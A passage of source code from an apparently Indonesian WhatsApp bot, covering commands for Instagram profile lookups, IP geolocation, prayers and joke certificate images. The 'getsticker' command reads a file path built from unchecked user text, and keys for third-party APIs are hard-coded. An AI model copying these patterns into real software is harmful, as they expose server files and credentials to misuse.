					pok = await getBuffer(nimek)
					zacky.sendMessage(from, pok, image, { quoted: mek, caption: `*PINTEREST*`})
					await limitAdd(sender)
					break 
					case 'jadwaltv':
					 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					gatauda = body.slice(10)					
					anu = await fetchJson(`https://api.zeks.xyz/api/jadwaltv?channel=${gatauda}&apikey=apivinz`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
					case 'igstalk':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					hmm = await fetchJson(`http://zekais-api.herokuapp.com/igs?username=${body.slice(9)}`)
					buffer = await getBuffer(hmm.data.profilehd)
					hasil = `Fullname : ${hmm.data.fullname}\nPengikut : ${hmm.data.follower}\nMengikuti : ${hmm.data.following}\nPrivate : ${hmm.data.private}\nVerified : ${hmm.data.is_verified}\nbio : ${hmm.data.bio}`
					zacky.sendMessage(from, buffer, image, {quoted: mek, caption: hasil})
					await limitAdd(sender)
					break
					//=====================================BATES NGAB=====================================\\
//islammenu
                case 'tahlil': 
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://zahirr-web.herokuapp.com/api/muslim/tahlil?apikey=zahirgans`, {method: 'get'})
				teks = '=================\n'
				for (let i of anu.result.data) {
				teks += `Title : ${i.title}\n*Arab* : ${i.arabic}\n*Terjemah* : ${i.translation}\n=================\n`
				}
				reply(teks.trim())
				break
                
		        case 'ayatkursi': 
		        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://zahirr-web.herokuapp.com/api/muslim/ayatkursi?apikey=zahirgans`)
				teks = ` *Arab* : ${anu.result.data.arabic}\n* Latin :* ${anu.result.data.latin}\n* Arti :* ${anu.result.data.translation}\n* Tafsir :* ${anu.result.data.tafsir}`
				zacky.sendMessage(from, teks, text, {quoted: mek})
				break
		        case 'doaharian': 
		        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				zacky.updatePresence(from, Presence.composing) 
				reply(ind.wait())
				asu = await fetchJson(`https://zahirr-web.herokuapp.com/api/muslim/doaharian?apikey=zahirgans`, {method: 'get'})
				teks = '=================\n'
				for (let i of asu.result.data) {
					teks += `*Nama Doa:* : ${i.title}\n*Arab* : ${i.arabic}\n*Latin* : ${i.latin}\n*Translation* : ${i.translation}\n=================\n`
				}
				reply(teks)
				break
		        case 'niatsholat':  
		        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://zahirr-web.herokuapp.com/api/muslim/niatshalat?apikey=zahirgans`, {method: 'get'})
				teks = '=================\n'
				for (let i of anu.result) {
				teks += `Sholat : ${i.name}\n*Arab* : ${i.arabic}\n*Latin* : ${i.latin}\n*Terjemah* : ${i.terjemahan}\n=================\n`
				}
				reply(teks.trim())
				break
//TAMBAH LAGI BROK BY M4N1K
            case 'fordward':
            if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
            if (isBanned) return reply('Maaf kamu sudah terbenned!')
	        zacky.sendMessage(from, `${body.slice(10)}`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true }})
            break
            case 'wame':
            if (isBanned) return reply('```Lu kebanned kontol```')
            if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
             zacky.updatePresence(from, Presence.composing)
             options = {
             text: `Link WhatsApp-Mu : *wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*Or ( / )*\n*api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
              contextInfo: {
              mentionedJid: [sender]
              }
              }
              zacky.sendMessage(from, options, text, {quoted: mek})
              break
              case 'say':
              teks = body.slice(5)
              if (!isRegistered) return reply(mess.only.daftarB)
              if (args.length < 1) return reply('teksnya mana kak?')
              saying = teks
              zacky.sendMessage(from, saying, text)
              break
                                case 'tagme':
                                        if (!isRegistered) return reply(mess.only.daftarB)
                                        var nom = mek.participant
                                        const tagme = {
                                                text: `@${nom.split("@s.whatsapp.net")[0]} Tuh dah ku tag!`,
                                                contextInfo: { mentionedJid: [nom] }
                                        }
                                        zacky.sendMessage(from, tagme, text, {quoted: mek})
                                        break
                                case 'cekip':
                                        ipnya = body.slice(5)
                                        if (!isRegistered) return reply(mess.only.daftarB)
                                        if (args.length < 1) return reply(`ip nya mana kak? \nContoh: ${prefix}ip 8.8.8.8`)
                                        if (isLimit(sender)) return reply(ind.limitend(pusname))
                                        anu = await fetchJson(`https://mnazria.herokuapp.com/api/check?ip=${ipnya}`, {method: 'get'})
                                        lang = anu.location.languages[0]
                                        teks = `◪ *IP* \n  │\n  ├❑ IP : ${anu.ip} \n  ├❑ City : ${anu.city} \n  ├❑ Continent Code : ${anu.continent_code} \n  ├❑ Continent Name : ${anu.continent_name} \n  ├❑ Country Code : ${anu.country_code} \n  ├❑ Country Name : ${anu.country_name} \n  ├❑ Latitude : ${anu.latitude} \n  ├❑ Calling Code : ${anu.location.calling_code} \n  ├❑ Capital : ${anu.location.capital} \n  ├❑ Country Flag : ${anu.location.country_flag} \n  ├❑ Country Flag Emoji : ${anu.location.country_flag_emoji} \n  ├❑ Country Flag Emoji Unicode : ${anu.location.country_flag_emoji_unicode} \n  ├❑ Geoname ID : ${anu.location.geoname_id} \n  ├❑ Languages : ${lang.code} , ${lang.name} , ${lang.native} \n  ├❑ Longitude : ${anu.longitude} \n  ├❑ Region Code : ${anu.region_code} \n  ├❑ Region Name : ${anu.region_name} \n  ├❑ Type : ${anu.type} \n  └❑ Zip : ${anu.zip} `
                                        zacky.sendMessage(from, teks, text)
                                        await limitAdd(sender)
                                        break
//sertifikatmenu
				case 'hekelserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}hekel ManikGanz*`)
				reply(ind.wait())
				ct = body.slice(11)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/HekerSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'dont forget to subscribe YouTube channel  mek Manik' })
				break
				    case 'babuserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}babu ManikGanz*`)
				reply(ind.wait())
				ct = body.slice(10)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/BabuSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'ffserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(8)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/EpepSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'bucinserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(11)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/BucinSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'bocilepepserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(15)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/CilEpepSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'gayserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(9)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/GaySerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'pacarserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(11)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/PacarSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'sadboyserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(12)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/SadBoySerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'surgaserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(11)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/SurgaSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'pinterserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ffserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(12)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/PintarSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'badgirlserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}badgirlserti ${pushname}`)
				reply(ind.wait())
				ct = body.slice(13)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/BadGirlSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'badboyserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}badboyserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(12)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/BadBoySerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'goodgirlserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}goodgirlserti ${pushname}`)
				reply(ind.wait())
				ct = body.slice(14)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/GoodGirlSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'goodboyserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}goodboyserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(13)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/GoodBoySerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'editodberkelasserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}editodberkelasserti ${pushname}`)
				reply(ind.wait())
				ct = body.slice(20)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/EditorBerkelasSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'goodlookingserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}goodlookingserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(17)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/GoodLookingSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'fucekboyserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fucekboyserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(14)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/FucekBoySerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'jametserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fucekboyserti ${pushname}`)
				reply(ind.wait())
				ct = body.slice(11)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/JametSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'youtuberserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}youtuberserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(14)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/YoutuberSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'fftourserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(12)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/FFSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'fftourserti2': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti2 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(13)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/FFSerti2/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'fftourserti3': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti3 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(13)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/FFSerti3/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'fftourserti4': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti4 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(13)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/FFSerti4/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'fftourserti5': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti5 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(13)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/FFSerti5/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'mltourserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}mltourserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(12)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/MLTourSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'mltourserti2': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}mltourserti2 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(13)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/MLTourSerti2/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'mltourserti3': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}mltourserti3 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(13)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/MLTourSerti3/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'mltourserti4': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}mltourserti4 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(13)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/MLTourSerti4/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'mltourserti5': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}mltourserti5 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(13)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/MLTourSerti5/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'pubgtourserti': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubgtourserti ManikGanz`)
				reply(ind.wait())
				ct = body.slice(14)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'pubgtourserti2': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubgtourserti2 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(15)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti2/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'pubgtourserti3': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubgtourserti3 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(15)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti3/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'pubgtourserti4': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubgtourserti4 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(15)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti4/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'pubgtourserti5': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubgtourserti5 ManikGanz`)
				reply(ind.wait())
				ct = body.slice(15)
				dapuhy = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti5/img.php?nama=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Subscribe mek Manik' })
				break
				    case 'credits':
teksits = `*DAFTAR PENGANTAR*

◪ *SPECIAL BIG THANX TO* :
Mhankbarbar | Arugia | Adiwajhsing | xptn | tobz | Pengguna bot | Penyedia api key | Maslent | Nazwa | Manik | Arifi Razzaq | Agus | Caliph | Rey | Rizki | Aulia | Natasya | Drawl Nagl | Nayla | Khadijah | Aurel | Galuh | Ramlan | Anker | Dan Creator Bot Lainnya

◪ *SALAM SANTUN MASTAH* :
| mek Manik•
| Arifi Razzaq•
| Aqulz
| Rvan
| Ivan
| Guvan
| mek-DN
| Dappa
| Isuf
| YogiPW`
zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: ftoko, caption: teksits, forwardingScore: 1000, isForwarded: true })
break
case 'blacklist':
case 'listblack':
//Fix By M4N1K
teks = '*Black List :*\n\n'
for (let awokwkwk of rekap) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${rekap.length}*`
zacky.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": rekap } })
break
case 'addblack': //PERCOBAAN
					if (!isOwner) return reply(ind.ownerb())
					mahnik = body.slice(10)
					rekap.push(`${mahnik}@s.whatsapp.net`)
					fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
					mahnuk = `Berhasil Menambahkan @${mahnik.split("@")[0]} Ke Daftar Premium`
					zacky.sendMessage(from, mahnuk, text, { quoted: ftoko, contextInfo: {"mentionedJid": [mahnik], forwardingScore: 1000, isForwarded: true }})
					break
				    case 'dellblack': //PERCOBAAN
					if (!isOwner) return reply(ind.ownerb())
					mahnek = body.slice(11)
					mahnak = rekap.indexOf(mahnek)
					rekap.splice(mahnak, 1)
					fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
					mahhk = `Berhasil Menghapus @${mahnek.split("@")[0]} Ke Daftar Premium`
					zacky.sendMessage(from, mahhk, text, { quoted: ftoko, contextInfo: {"mentionedJid": [mahnek], forwardingScore: 1000, isForwarded: true }})
					break			
					
case 'getsticker':
case 'gets':
//Fix By M4N1K
namastc = body.slice(12)
result = fs.readFileSync(`./add/stickers/${namastc}.webp`)
zacky.sendMessage(from, result, sticker, {quoted :mek})
break

case 'stickerlist':
case 'liststicker':
//Fix By M4N1K
teks = '*Sticker List :*\n\n'
for (let awokwkwk of setiker) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setiker.length}*`
